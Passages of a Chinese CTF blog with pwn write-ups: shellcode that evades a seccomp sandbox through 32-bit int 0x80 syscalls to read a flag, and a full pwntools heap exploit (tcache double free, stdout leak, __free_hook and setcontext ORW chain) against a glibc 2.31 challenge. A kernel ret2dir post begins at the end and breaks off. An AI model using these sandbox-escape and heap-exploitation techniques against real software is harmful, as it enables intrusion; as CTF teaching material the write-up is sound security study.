<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>因为能够申请的堆大小可以是largebin范围里的，而且有两个可控的堆指针、漏洞是UAF，同时即便堆指针满了也可以继续申请chunk，这时就不难想到用largebin attack，程序本身可以exit，很自然就想到可以打IO。这一部分很简单这里不过多赘述，这题的重点在怎么过沙箱。</p>
<p>在看到mprotect时就可以想到这部分用的应该是shellcode过，第一眼看到这个沙箱时我就感觉是跟2021强网的shellcode题一样的过法（因为ban了open），顺带贴一下那题的沙箱</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>在复现那题的时候看网上的wp都是先执行<code>retfq</code>去切一下程序架构，然后用<code>int 0x80</code>去跑32位的open。但是在做这题时我发现即便没用<code>retfq</code>去切架构，同样能直接去跑32位的open，这就让我想知道为什么强网那题大家都先切一下架构去跑open然后再切回来跑read……</p>
<p>为了方便测试，我把强网shellcode那题的可见字符过滤patch掉了，然后试着直接去<code>int 0x80</code>调32位的open，发现同样成功了（仍然要注意寄存器数据的长度），所以对于这题先去切架构是不是多此一举我还留有疑问</p>
<p>接着我自己写一些沙箱去做测试，然后发现<strong>无论程序本身的架构是32还是64位，程序都会根据具体执行的系统调用指令（<code>int 0x80/syscall</code>）去选择调用32位还是64位的函数</strong>，另外，如果沙箱严格检查程序架构（比如<code>A = arch; if (A != ARCH_X86_64) goto KILL</code>这种格式），<strong>那么无论切不切架构都无法调另一个架构下的函数（即便系统调用号相同）。</strong></p>
<p>（2022.11.11：目前为止还不知道为什么在这题沙箱的架构检查下可以直接去调另一个架构下相同调用号的函数）</p>
<h4 id="整体过法"><a href="#整体过法" class="headerlink" title="整体过法"></a>整体过法</h4><p>因为这题远程的flag名称是随机的，所以可以选择先open当前目录，然后调用32位的<code>getdents</code>函数（对应64位的<code>setpriority </code>）来把目录信息读到rsp中，然后用<code>add rcx</code>去让rcx指向flag的名称的地址之后再调orw即可。下面这块shellcode是另一位师傅发的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">shellcode = &#x27;&#x27;&#x27;</span><br><span class="line">	//mmap(0x0x500000,0x5000,3,100022,0,0)</span><br><span class="line">    mov rax, 0xc0</span><br><span class="line">    mov rbx, 0x500000</span><br><span class="line">    mov rcx, 0x5000</span><br><span class="line">    mov rdx, 3</span><br><span class="line">    mov rsi, 1048610</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    xor rbp, rbp</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov rsp, 0x500a00</span><br><span class="line">	//open(&#x27;.&#x27;,0,0)</span><br><span class="line">    mov rax, 5</span><br><span class="line">    push 0x2e</span><br><span class="line">    mov rbx, rsp</span><br><span class="line">    xor rcx, rcx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">	//int getdents(unsigned int fd, struct dirent *dirp, unsigned int count);</span><br><span class="line">	//gendents(3,rsp,0x1337)</span><br><span class="line">    mov rbx, rax</span><br><span class="line">    mov rax, 0x8d</span><br><span class="line">    mov rcx, rsp</span><br><span class="line">    mov rdx, 0x1337</span><br><span class="line">    int 0x80</span><br><span class="line">	</span><br><span class="line">	//make rcx point to flag`s name</span><br><span class="line">    add rcx, 0x56</span><br><span class="line">    </span><br><span class="line">    //open flag</span><br><span class="line">    mov rax, 5</span><br><span class="line">    mov rbx, rcx</span><br><span class="line">    xor rcx, rcx</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 0x100</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 1</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>实际打的时候要调一下<code>add rcx, 0x56</code>的这个值，让rcx指向flag的名字，要做到这点可以先去打印一遍远程目录的信息，找到flag对应的偏移然后更改shellcode即可</p>
<h2 id="only"><a href="#only" class="headerlink" title="only"></a>only</h2><p>比赛结束后一个小时才做出来，稍微有点可惜</p>
<p>题目简述：2.31堆题，开了沙箱黑名单ban execve，要注意的是这题的沙箱是用seccomp函数开的，所以bin中本身就有很多chunk。菜单除了一个特别功能以外只有add和delete，漏洞为delete中的UAF。</p>
<p>最多只能free 4次</p>
<p>add如下，malloc大小限制在0-0xE7，最多用11次，比较特别的是只有一个堆指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !Count_add )                             <span class="comment">// 0xb</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = ReadInt();</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0xE7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  Heap = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !Heap )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  my_read(Heap, size);</span><br><span class="line">  --Count_add;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>特别功能的函数如下，很明显正常情况下这个函数只能用一次，这个函数的重点在于在<code>Heap</code>非空的情况下其会把对应chunk中的fd和bk置零，利用这个可以把tcache chunk中的key情况，拿一个double free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add_one</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> Int; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( Mark == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Mark = <span class="number">0</span>;</span><br><span class="line">    Int = <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !Heap )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">      Int = ReadInt();</span><br><span class="line">      <span class="keyword">if</span> ( Int &lt;= <span class="number">0</span> || Int &gt; <span class="number">0xE7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      Heap = <span class="built_in">malloc</span>(Int);</span><br><span class="line">      <span class="keyword">if</span> ( !Heap )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(Heap, <span class="number">0</span>, Int);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>首先很自然能想到的一点就是因为要用ORW，所以肯定要泄漏libc，而且用到的输出函数是puts，那么很明显就是部分fd打stdout。</p>
<p>程序执行到我们可控的地方时的bin如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  7]: 0x55555555b8f0 —▸ 0x55555555ba00 —▸ 0x55555555bcb0 —▸ 0x55555555be30 —▸ 0x55555555bc90 ◂— ...</span><br><span class="line">0x50 [  1]: 0x55555555bf60 ◂— 0x0</span><br><span class="line">0x70 [  7]: 0x55555555b800 —▸ 0x55555555bba0 —▸ 0x55555555b910 —▸ 0x55555555bb30 —▸ 0x55555555bcd0 ◂— ...</span><br><span class="line">0x80 [  5]: 0x55555555b870 —▸ 0x55555555b980 —▸ 0x55555555bc10 —▸ 0x55555555bec0 —▸ 0x55555555ba90 ◂— ...</span><br><span class="line">0xd0 [  1]: 0x55555555b350 ◂— 0x0</span><br><span class="line">0xf0 [  2]: 0x55555555bd40 —▸ 0x55555555b6b0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x55555555b7d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>找一下堆可以发现有两个chunk中残留了libc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x55555555b2f0 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0x0, </span><br><span class="line">  mchunk_size = 0x31, </span><br><span class="line">  fd = 0x7ffff7fabc80, </span><br><span class="line">  bk = 0x55555555b670, </span><br><span class="line">  fd_nextsize = 0x1, </span><br><span class="line">  bk_nextsize = 0x55555555b490</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">0x55555555b450 FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = 0x0, </span><br><span class="line">  mchunk_size = 0x31, </span><br><span class="line">  fd = 0x7ffff7fabc80, </span><br><span class="line">  bk = 0x55555555b7a0, </span><br><span class="line">  fd_nextsize = 0x1, </span><br><span class="line">  bk_nextsize = 0x55555555b580</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">gdb-peda$ p stdout</span><br><span class="line">$1 = (FILE *) 0x7ffff7d876a0 &lt;_IO_2_1_stdout_&gt;</span><br></pre></td></tr></table></figure>

<p>但是这两个地址跟stdout结构体的地址差太多了，直接用这个libc去爆破stdout不现实，所以还是得覆写一个unsorted bin chunk</p>
<p>首先利用特殊功能函数清空一个tcache chunk的key，拿到一个double free去爆破0.5字节拿到tcache struct，修改对应tcache bin的计数使得tcache entry能被free到unsorted bin里，这样后面再想修改tcache struct时就可以直接在unsorted bin里割出部分chunk来修改，这样可以节省几次free的次数。同时部分写tcache entry来让自己能拿到想要的chunk。</p>
<p>大概的思路就是这样，这部分的逻辑关系实在是不太好描述，看exp更好理解，如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;,arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;172.52.10.71&quot;,9999)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x17D9)&#x27;) #write</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(content) &lt; size:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add0</span>(<span class="params">size=<span class="number">0</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	add(<span class="number">0xe0</span>)</span><br><span class="line">	free() <span class="comment">#1 </span></span><br><span class="line">	add0() <span class="comment">#clean tcache key</span></span><br><span class="line">	free() <span class="comment">#2</span></span><br><span class="line">	add(<span class="number">0xe0</span>,<span class="string">&#x27;\x10\xb0&#x27;</span>)</span><br><span class="line">	add(<span class="number">0xe0</span>)</span><br><span class="line"></span><br><span class="line">	add(<span class="number">0xe0</span>,p16(<span class="number">3</span>)*(<span class="number">4</span>*<span class="number">3</span>)+p16(<span class="number">0</span>)+p16(<span class="number">0xffff</span>)*(<span class="number">4</span>*<span class="number">10</span>-<span class="number">1</span>-<span class="number">4</span>)+p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + <span class="string">&#x27;\x10\xb0&#x27;</span>)</span><br><span class="line">	free() <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0x80</span>,<span class="string">&#x27;\xa0\xd6&#x27;</span>)</span><br><span class="line">	add(<span class="number">0x60</span>,p16(<span class="number">3</span>)*(<span class="number">4</span>*<span class="number">3</span>)+p16(<span class="number">0</span>)+p16(<span class="number">0xffff</span>)*(<span class="number">4</span>*<span class="number">10</span>-<span class="number">1</span>-<span class="number">4</span>))</span><br><span class="line">	add(<span class="number">0x60</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&quot;\x00&quot;</span>) <span class="comment">#7</span></span><br><span class="line">	p.recv(<span class="number">8</span>)</span><br><span class="line">	libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7fd3f2736980</span> - <span class="number">0x00007fd3f254b000</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	</span><br><span class="line">	malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">	free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">	exit_hook = libc_base + (<span class="number">0x7ffff7ffdf70</span> - <span class="number">0x00007ffff7b9b000</span>)</span><br><span class="line">	pop_rsp = libc_base + <span class="number">0x0000000000032b5a</span></span><br><span class="line">	pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">	pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">	read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">	ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	gadget = libc_base + (<span class="number">0x7ffff7cef930</span> - <span class="number">0x00007ffff7b9b000</span>)</span><br><span class="line">	data = libc_base + (<span class="number">0x00007ffff7b98000</span> - <span class="number">0x00007ffff7b9b000</span>) + <span class="number">0x100</span></span><br><span class="line">	setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">	ret = libc_base + <span class="number">0x00000000000c054a</span></span><br><span class="line">	<span class="comment">#0x7ffff7cef930 &lt;getkeyserv_handle+576&gt;:	mov    rdx,QWORD PTR [rdi+0x8]</span></span><br><span class="line">	<span class="comment">#0x7ffff7cef934 &lt;getkeyserv_handle+580&gt;:	mov    QWORD PTR [rsp],rax</span></span><br><span class="line">	<span class="comment">#0x7ffff7cef938 &lt;getkeyserv_handle+584&gt;:	call   QWORD PTR [rdx+0x20]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	flag_addr = data + <span class="number">0x110</span></span><br><span class="line">	orw_addr = data + <span class="number">0x8</span></span><br><span class="line">	add(<span class="number">0xd0</span>,p64(<span class="number">0</span>)*<span class="number">7</span> + p64(free_hook)+p64(data) + p64(data+<span class="number">0x100</span>)) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">	orw = p64(<span class="number">0</span>) + p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">	orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(data) + p64(pop_rdx_r12) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(read)</span><br><span class="line">	orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(data) + p64(pop_rdx_r12) + p64(<span class="number">0x40</span>) + p64(<span class="number">0</span>) + p64(write)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	payload = p64(data+<span class="number">0x110</span>)<span class="comment">#rdi</span></span><br><span class="line">	payload += p64(data+<span class="number">0x100</span>)</span><br><span class="line">	payload += <span class="string">&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload = payload.ljust(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload += p64(setcontext+<span class="number">61</span>)</span><br><span class="line">	payload = payload.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload += p64(orw_addr)<span class="comment">#rsp</span></span><br><span class="line">	payload += p64(ret)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0xa0</span>,p64(gadget))</span><br><span class="line">	add(<span class="number">0xb0</span>,orw) <span class="comment">#data == orw</span></span><br><span class="line">	add(<span class="number">0xc0</span>,payload) <span class="comment">#data+0x100 == payload</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#gdb.attach(p,&#x27;b free&#x27;)</span></span><br><span class="line">	free()</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">		p = remote(<span class="string">&quot;172.52.10.233&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">		pwn()</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		p.close()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/10/23/MINI-LCTF2022-kgadget/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/23/MINI-LCTF2022-kgadget/" class="post-title-link" itemprop="url">MINI-LCTF2022-kgadget(ret2dir)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-10-23 21:24:34" itemprop="dateCreated datePublished" datetime="2022-10-23T21:24:34+08:00">2022-10-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-10-24 11:17:27" itemprop="dateModified" datetime="2022-10-24T11:17:27+08:00">2022-10-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h3><p>大佬的博客说得很详细了<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog</a></p>
<p>这里只简单说下我的理解，可能会有理解错误的地方：在x86下的Linux内核中存在一块叫<code>direct mapping area</code>（线性映射区）的区域，这块区域在内核中直接线性地映射了<strong>整片物理内存空间</strong>，这就意味着任意一块用户内存都能用内核</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>首先是<code>init</code>文件</p>
